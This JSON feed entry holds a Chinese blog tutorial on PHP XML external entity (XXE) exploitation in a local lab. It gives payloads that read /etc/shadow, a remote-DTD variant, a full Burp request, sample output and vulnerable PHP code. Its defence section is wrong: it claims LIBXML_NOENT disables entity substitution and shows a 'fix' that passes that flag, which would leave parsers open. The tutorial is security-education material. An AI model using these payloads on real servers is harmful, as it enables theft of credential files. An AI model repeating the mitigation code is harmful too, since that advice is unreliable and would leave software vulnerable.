{
    "version": "https://jsonfeed.org/version/1",
    "title": "bae的博客 • All posts by \"php\" tag",
    "description": "bae的个人博客",
    "home_page_url": "https://bae-ace.github.io",
    "items": [
        {
            "id": "https://bae-ace.github.io/2025/07/29/PHP-XXE-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E5%8E%9F%E7%90%86/",
            "url": "https://bae-ace.github.io/2025/07/29/PHP-XXE-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E5%8E%9F%E7%90%86/",
            "title": "PHP XXE 漏洞利用与原理",
            "date_published": "2025-07-29T06:39:23.000Z",
            "content_html": "<h1 id=\"PHP-XXE-漏洞利用与原理\"><a href=\"#PHP-XXE-漏洞利用与原理\" class=\"headerlink\" title=\"PHP XXE 漏洞利用与原理\"></a>PHP XXE 漏洞利用与原理</h1><h2 id=\"引言\"><a href=\"#引言\" class=\"headerlink\" title=\"引言\"></a>引言</h2><p>XML External Entity Injection（XXE）是一种针对 XML 解析器的安全漏洞，广泛存在于处理 XML 输入的 Web 应用中。PHP 应用若使用不安全的 XML 解析配置，可能导致攻击者通过构造恶意 XML 载荷读取敏感文件、发起 SSRF（服务器端请求伪造）或执行其他恶意操作。本文将详细讲解 PHP XXE 漏洞的原理、利用步骤、靶场环境搭建，以及防护建议，旨在帮助读者深入理解并有效应对此类漏洞。</p>\n<hr>\n<h2 id=\"一、XXE-漏洞简介\"><a href=\"#一、XXE-漏洞简介\" class=\"headerlink\" title=\"一、XXE 漏洞简介\"></a>一、XXE 漏洞简介</h2><p>XXE（XML External Entity Injection）漏洞发生在 XML 解析器处理外部实体时，若未正确配置，允许攻击者通过恶意 XML 输入加载外部实体，从而执行文件读取、SSRF 或其他攻击。PHP 环境中，常见于使用 <code>libxml2</code> 库（如 <code>SimpleXMLElement</code> 或 <code>DOMDocument</code>）解析 XML 时，未禁用外部实体解析。</p>\n<p><strong>危害</strong>：</p>\n<ul>\n<li>读取服务器本地文件（如 <code>/etc/passwd</code>、<code>/etc/shadow</code>）。</li>\n<li>发起 SSRF，访问内网资源。</li>\n<li>在特定条件下，可能导致拒绝服务（DoS）或远程代码执行（RCE）。</li>\n</ul>\n<hr>\n<h2 id=\"二、漏洞原理\"><a href=\"#二、漏洞原理\" class=\"headerlink\" title=\"二、漏洞原理\"></a>二、漏洞原理</h2><p>XXE 漏洞的核心在于 XML 解析器对外部实体（External Entities）的处理。XML 支持通过 <code>&lt;!ENTITY&gt;</code> 定义实体，实体可以引用本地文件或远程资源。如果解析器未限制外部实体加载，攻击者可通过以下方式触发漏洞：</p>\n<ol>\n<li><p><strong>构造恶意 XML 载荷</strong>：</p>\n<ul>\n<li><p>使用 <code>&lt;!DOCTYPE&gt;</code> 和 <code>&lt;!ENTITY&gt;</code> 定义外部实体，指向本地文件（如 <code>file:///etc/shadow</code>）或远程资源。</p>\n</li>\n<li><p>示例：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs xml\"><span class=\"hljs-meta\">&lt;!DOCTYPE a [</span><br><span class=\"hljs-meta\">  <span class=\"hljs-meta\">&lt;!ENTITY <span class=\"hljs-keyword\">aaa</span> <span class=\"hljs-keyword\">SYSTEM</span> <span class=\"hljs-string\">&quot;file:///etc/shadow&quot;</span>&gt;</span></span><br><span class=\"hljs-meta\">]&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span>&gt;</span><span class=\"hljs-symbol\">&amp;aaa;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">a</span>&gt;</span><br></code></pre></td></tr></table></figure></li>\n</ul>\n</li>\n<li><p><strong>服务器解析 XML</strong>：</p>\n<ul>\n<li>服务器使用不安全的 XML 解析器（如 PHP 的 <code>DOMDocument</code>）处理输入。</li>\n<li>解析器加载外部实体，将文件内容替换到实体引用（如 <code>&amp;aaa;</code>）。</li>\n</ul>\n</li>\n<li><p><strong>信息泄露或进一步攻击</strong>：</p>\n<ul>\n<li>解析器回显实体内容（如 <code>/etc/shadow</code>），导致敏感信息泄露。</li>\n<li>若支持远程实体，可加载攻击者控制的 DTD 文件，触发 SSRF 或更复杂攻击。</li>\n</ul>\n</li>\n</ol>\n<p><strong>关键条件</strong>：</p>\n<ul>\n<li>服务器允许外部实体解析（PHP 默认未禁用 <code>libxml2</code> 的外部实体）。</li>\n<li>应用直接处理用户提交的 XML 输入。</li>\n<li>解析结果可能被回显或以某种方式暴露。</li>\n</ul>\n<hr>\n<h2 id=\"三、靶场环境准备\"><a href=\"#三、靶场环境准备\" class=\"headerlink\" title=\"三、靶场环境准备\"></a>三、靶场环境准备</h2><p>以下是复现 PHP XXE 漏洞的环境搭建步骤，基于提供的靶场要求：</p>\n<h3 id=\"环境要求\"><a href=\"#环境要求\" class=\"headerlink\" title=\"环境要求\"></a>环境要求</h3><ul>\n<li><strong>操作系统</strong>：Kali Linux（IP：192.168.56.102，仅主机网卡）</li>\n<li><strong>靶场地址</strong>：<code>http://192.168.56.102:8080/</code></li>\n<li><strong>工具</strong>：<ul>\n<li>Burp Suite：抓包与修改 HTTP 请求</li>\n<li>Firefox 浏览器：设置代理到 Burp Suite（127.0.0.1:8080）</li>\n<li>Python HTTP 服务（可选）：托管远程 DTD 文件</li>\n</ul>\n</li>\n<li><strong>前提</strong>：已完成《php xxe漏洞靶场搭建.docx》中的搭建步骤，靶场运行正常。</li>\n</ul>\n<h3 id=\"快速验证靶场\"><a href=\"#快速验证靶场\" class=\"headerlink\" title=\"快速验证靶场\"></a>快速验证靶场</h3><ol>\n<li><p>启动靶场：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">docker-compose up -d<br></code></pre></td></tr></table></figure>\n</li>\n<li><p>确认靶场可访问：</p>\n<ul>\n<li>在 Firefox 浏览器中访问 <code>http://192.168.56.102:8080/dom.php</code>。</li>\n<li>若页面正常加载，靶场搭建成功。</li>\n</ul>\n</li>\n<li><p>配置 Burp Suite 和 Firefox：</p>\n<ul>\n<li>启动 Burp Suite，启用 Proxy 模块，默认监听 <code>127.0.0.1:8080</code>。</li>\n<li>在 Firefox 中设置手动代理，指向 <code>127.0.0.1:8080</code>。</li>\n</ul>\n</li>\n<li><p>（可选）准备远程 DTD 服务：</p>\n<ul>\n<li><p>在 Kali 上启动 Python HTTP 服务：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">python3 -m http.server 80<br></code></pre></td></tr></table></figure>\n</li>\n<li><p>将 <code>test.dtd</code> 放入 HTTP 服务根目录，内容如下：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs xml\"><span class=\"hljs-meta\">&lt;!ENTITY <span class=\"hljs-keyword\">aaa</span> <span class=\"hljs-keyword\">SYSTEM</span> <span class=\"hljs-string\">&quot;file:///etc/shadow&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure></li>\n</ul>\n</li>\n</ol>\n<hr>\n<h2 id=\"四、漏洞利用步骤\"><a href=\"#四、漏洞利用步骤\" class=\"headerlink\" title=\"四、漏洞利用步骤\"></a>四、漏洞利用步骤</h2><h3 id=\"1-启动-Burp-Suite-并抓包\"><a href=\"#1-启动-Burp-Suite-并抓包\" class=\"headerlink\" title=\"1. 启动 Burp Suite 并抓包\"></a>1. 启动 Burp Suite 并抓包</h3><ul>\n<li><p>打开 Burp Suite，确认 Proxy 模块监听 <code>127.0.0.1:8080</code>。</p>\n</li>\n<li><p>在 Firefox 中访问靶场漏洞页面：<code>http://192.168.56.102:8080/dom.php</code>。</p>\n</li>\n<li><p>Burp Suite 拦截到以下 GET 请求：</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs http\"><span class=\"hljs-keyword\">GET</span> <span class=\"hljs-string\">/dom.php</span> <span class=\"hljs-meta\">HTTP/1.1</span><br><span class=\"hljs-attribute\">Host</span><span class=\"hljs-punctuation\">: </span>192.168.56.102:8080<br><span class=\"hljs-attribute\">User-Agent</span><span class=\"hljs-punctuation\">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0<br><span class=\"hljs-attribute\">Accept</span><span class=\"hljs-punctuation\">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class=\"hljs-attribute\">Accept-Language</span><span class=\"hljs-punctuation\">: </span>zh-CN,zh;q=0.8<br><span class=\"hljs-attribute\">Connection</span><span class=\"hljs-punctuation\">: </span>close<br></code></pre></td></tr></table></figure>\n</li>\n<li><p>右键点击请求，选择 “Send to Repeater” 以便后续修改。</p>\n</li>\n</ul>\n<h3 id=\"2-构造-XXE-Payload\"><a href=\"#2-构造-XXE-Payload\" class=\"headerlink\" title=\"2. 构造 XXE Payload\"></a>2. 构造 XXE Payload</h3><p>以下是两种常见的 XXE 攻击载荷：</p>\n<h4 id=\"Payload-1：读取本地文件（如-etc-shadow）\"><a href=\"#Payload-1：读取本地文件（如-etc-shadow）\" class=\"headerlink\" title=\"Payload 1：读取本地文件（如 /etc/shadow）\"></a>Payload 1：读取本地文件（如 <code>/etc/shadow</code>）</h4><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs xml\"><span class=\"hljs-meta\">&lt;?xml version=<span class=\"hljs-string\">&quot;1.0&quot;</span> encoding=<span class=\"hljs-string\">&quot;UTF-8&quot;</span>?&gt;</span><br><span class=\"hljs-meta\">&lt;!DOCTYPE a [</span><br><span class=\"hljs-meta\">  <span class=\"hljs-meta\">&lt;!ENTITY <span class=\"hljs-keyword\">aaa</span> <span class=\"hljs-keyword\">SYSTEM</span> <span class=\"hljs-string\">&quot;file:///etc/shadow&quot;</span>&gt;</span></span><br><span class=\"hljs-meta\">]&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span>&gt;</span><span class=\"hljs-symbol\">&amp;aaa;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">a</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p><strong>说明</strong>：</p>\n<ul>\n<li><code>&lt;!ENTITY aaa SYSTEM &quot;file:///etc/shadow&quot;&gt;</code> 定义了一个外部实体，指向服务器本地文件 <code>/etc/shadow</code>。</li>\n<li><code>&lt;a&gt;&amp;aaa;&lt;/a&gt;</code> 引用实体，解析时会将文件内容替换到 <code>&amp;aaa;</code>。</li>\n</ul>\n<h4 id=\"Payload-2：远程加载-DTD\"><a href=\"#Payload-2：远程加载-DTD\" class=\"headerlink\" title=\"Payload 2：远程加载 DTD\"></a>Payload 2：远程加载 DTD</h4><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs xml\"><span class=\"hljs-meta\">&lt;?xml version=<span class=\"hljs-string\">&quot;1.0&quot;</span> encoding=<span class=\"hljs-string\">&quot;UTF-8&quot;</span>?&gt;</span><br><span class=\"hljs-meta\">&lt;!DOCTYPE a [</span><br><span class=\"hljs-meta\">  <span class=\"hljs-meta\">&lt;!ENTITY % y <span class=\"hljs-keyword\">SYSTEM</span> <span class=\"hljs-string\">&quot;http://192.168.56.102/test.dtd&quot;</span>&gt;</span></span><br><span class=\"hljs-meta\">  %y;</span><br><span class=\"hljs-meta\">]&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span>&gt;</span><span class=\"hljs-symbol\">&amp;aaa;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">a</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p><strong>远程</strong> <code>test.dtd</code> <strong>内容</strong>：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs xml\"><span class=\"hljs-meta\">&lt;!ENTITY <span class=\"hljs-keyword\">aaa</span> <span class=\"hljs-keyword\">SYSTEM</span> <span class=\"hljs-string\">&quot;file:///etc/shadow&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p><strong>说明</strong>：</p>\n<ul>\n<li><code>&lt;!ENTITY % y SYSTEM &quot;http://192.168.56.102/test.dtd&quot;&gt;</code> 加载远程 DTD 文件。</li>\n<li><code>%y;</code> 执行 DTD 中的定义，间接加载 <code>/etc/shadow</code>。</li>\n<li>适用于绕过本地实体限制或实现更复杂的攻击。</li>\n</ul>\n<h3 id=\"3-发送攻击请求\"><a href=\"#3-发送攻击请求\" class=\"headerlink\" title=\"3. 发送攻击请求\"></a>3. 发送攻击请求</h3><p>在 Burp Suite 的 Repeater 模块中，构造以下 POST 请求（以 Payload 1 为例）：</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs http\"><span class=\"hljs-keyword\">POST</span> <span class=\"hljs-string\">/dom.php</span> <span class=\"hljs-meta\">HTTP/1.1</span><br><span class=\"hljs-attribute\">Host</span><span class=\"hljs-punctuation\">: </span>192.168.56.102:8080<br><span class=\"hljs-attribute\">User-Agent</span><span class=\"hljs-punctuation\">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64)<br><span class=\"hljs-attribute\">Accept</span><span class=\"hljs-punctuation\">: </span>*/*<br><span class=\"hljs-attribute\">Content-Type</span><span class=\"hljs-punctuation\">: </span>application/xml<br><span class=\"hljs-attribute\">Content-Length</span><span class=\"hljs-punctuation\">: </span>132<br><br><span class=\"language-xml\"><span class=\"hljs-meta\">&lt;?xml version=<span class=\"hljs-string\">&quot;1.0&quot;</span> encoding=<span class=\"hljs-string\">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class=\"language-xml\"><span class=\"hljs-meta\">&lt;!DOCTYPE a [</span></span><br><span class=\"hljs-meta\"><span class=\"language-xml\">  <span class=\"hljs-meta\">&lt;!ENTITY <span class=\"hljs-keyword\">aaa</span> <span class=\"hljs-keyword\">SYSTEM</span> <span class=\"hljs-string\">&quot;file:///etc/shadow&quot;</span>&gt;</span></span></span><br><span class=\"hljs-meta\"><span class=\"language-xml\">]&gt;</span></span><br><span class=\"language-xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span>&gt;</span><span class=\"hljs-symbol\">&amp;aaa;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">a</span>&gt;</span></span><br></code></pre></td></tr></table></figure>\n\n<p><strong>关键点</strong>：</p>\n<ul>\n<li>设置 <code>Content-Type: application/xml</code> 以确保服务器按 XML 解析。</li>\n<li>调整 <code>Content-Length</code> 为实际载荷长度。</li>\n<li>点击 “Send”，发送请求。</li>\n</ul>\n<h3 id=\"4-验证攻击结果\"><a href=\"#4-验证攻击结果\" class=\"headerlink\" title=\"4. 验证攻击结果\"></a>4. 验证攻击结果</h3><ul>\n<li><p>若靶场未正确过滤外部实体，响应中会回显 <code>/etc/shadow</code> 文件内容，形如：</p>\n<figure class=\"highlight dns\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs dns\">root:$<span class=\"hljs-number\">6</span>$...[hash]...:<span class=\"hljs-number\">18356:0</span>:<span class=\"hljs-number\">99999:7</span>:::<br>daemon:*:<span class=\"hljs-number\">18356:0</span>:<span class=\"hljs-number\">99999:7</span>:::<br>...<br></code></pre></td></tr></table></figure>\n</li>\n<li><p>若使用 Payload 2，确认 Python HTTP 服务日志中有 <code>test.dtd</code> 的请求记录，且响应仍包含 <code>/etc/shadow</code> 内容。</p>\n</li>\n</ul>\n<p><strong>验证成功标志</strong>：</p>\n<ul>\n<li>响应中包含敏感文件内容。</li>\n<li>无回显（盲 XXE）情况下，可通过外部 DTD 请求或错误信息推断漏洞存在。</li>\n</ul>\n<hr>\n<h2 id=\"五、XXE-漏洞深入分析\"><a href=\"#五、XXE-漏洞深入分析\" class=\"headerlink\" title=\"五、XXE 漏洞深入分析\"></a>五、XXE 漏洞深入分析</h2><h3 id=\"触发流程\"><a href=\"#触发流程\" class=\"headerlink\" title=\"触发流程\"></a>触发流程</h3><ol>\n<li><strong>不安全的 XML 解析</strong>：<ul>\n<li>PHP 应用使用 <code>DOMDocument</code> 或 <code>SimpleXMLElement</code> 处理 XML 输入。</li>\n<li>默认配置未禁用外部实体（<code>libxml_disable_entity_loader(false)</code>）。</li>\n</ul>\n</li>\n<li><strong>恶意实体注入</strong>：<ul>\n<li>攻击者提交包含 <code>&lt;!ENTITY&gt;</code> 的 XML 载荷。</li>\n<li>实体引用本地文件、远程 URL 或参数实体。</li>\n</ul>\n</li>\n<li><strong>信息泄露或攻击</strong>：<ul>\n<li>解析器加载实体内容，可能导致：<ul>\n<li>本地文件内容泄露。</li>\n<li>SSRF（访问内网资源，如 <code>http://localhost:8080</code>）。</li>\n<li>DoS（如加载 <code>/dev/random</code> 或构造 Billion Laughs 攻击）。</li>\n</ul>\n</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"PHP-环境中的常见问题\"><a href=\"#PHP-环境中的常见问题\" class=\"headerlink\" title=\"PHP 环境中的常见问题\"></a>PHP 环境中的常见问题</h3><ul>\n<li><p><strong>默认配置</strong>：PHP 的 <code>libxml2</code> 默认允许外部实体加载。</p>\n</li>\n<li><p><strong>代码示例</strong>（易受攻击的 PHP 代码）：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-variable\">$xml</span> = <span class=\"hljs-title function_ invoke__\">file_get_contents</span>(<span class=\"hljs-string\">&#x27;php://input&#x27;</span>);<br><span class=\"hljs-variable\">$dom</span> = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">DOMDocument</span>();<br><span class=\"hljs-variable\">$dom</span>-&gt;<span class=\"hljs-title function_ invoke__\">loadXML</span>(<span class=\"hljs-variable\">$xml</span>);<br><span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$dom</span>-&gt;textContent;<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>上述代码直接解析用户输入的 XML，未禁用外部实体，易受 XXE 攻击。</p>\n</li>\n</ul>\n<hr>\n<h2 id=\"六、防护建议\"><a href=\"#六、防护建议\" class=\"headerlink\" title=\"六、防护建议\"></a>六、防护建议</h2><ol>\n<li><p><strong>禁用外部实体解析</strong>：</p>\n<ul>\n<li><p>在 PHP 中使用 <code>libxml_disable_entity_loader(true)</code>：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-title function_ invoke__\">libxml_disable_entity_loader</span>(<span class=\"hljs-literal\">true</span>);<br><span class=\"hljs-variable\">$dom</span> = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">DOMDocument</span>();<br><span class=\"hljs-variable\">$dom</span>-&gt;<span class=\"hljs-title function_ invoke__\">loadXML</span>(<span class=\"hljs-variable\">$xml</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br></code></pre></td></tr></table></figure>\n</li>\n<li><p>或设置 <code>LIBXML_NOENT</code> 标志禁用实体替换。</p>\n</li>\n</ul>\n</li>\n<li><p><strong>使用安全的解析方式</strong>：</p>\n<ul>\n<li>避免直接解析用户提交的 XML。</li>\n<li>使用 JSON 或其他格式替代 XML。</li>\n</ul>\n</li>\n<li><p><strong>白名单验证输入</strong>：</p>\n<ul>\n<li>验证 XML 结构，仅允许预期的标签和属性。</li>\n<li>使用 XML Schema 或 DTD 限制输入。</li>\n</ul>\n</li>\n<li><p><strong>网络隔离</strong>：</p>\n<ul>\n<li>限制服务器出站连接，防止 SSRF 访问内网资源。</li>\n<li>使用防火墙阻止非必要外部请求。</li>\n</ul>\n</li>\n<li><p><strong>升级依赖</strong>：</p>\n<ul>\n<li>确保 PHP 和 <code>libxml2</code> 库为最新版本，修复已知漏洞。</li>\n</ul>\n</li>\n<li><p><strong>错误信息屏蔽</strong>：</p>\n<ul>\n<li>禁用详细错误回显，避免泄露文件路径或系统信息。</li>\n</ul>\n</li>\n</ol>\n<hr>\n<h2 id=\"七、总结\"><a href=\"#七、总结\" class=\"headerlink\" title=\"七、总结\"></a>七、总结</h2><p>PHP XXE 漏洞利用展示了 XML 解析器在处理外部实体时的安全风险。通过构造恶意 XML 载荷，攻击者可轻松读取服务器敏感文件或发起 SSRF 攻击。开发者和安全从业者应重视 XML 解析的配置安全，采取禁用外部实体、输入验证等措施，降低漏洞风险。</p>\n<blockquote>\n<p><strong>免责声明</strong>: 本文内容仅供安全研究和防护参考，请勿用于非法攻击活动。</p>\n</blockquote>\n",
            "tags": [
                "Web安全",
                "XXE",
                "漏洞复现",
                "PHP",
                "SSRF"
            ]
        }
    ]
}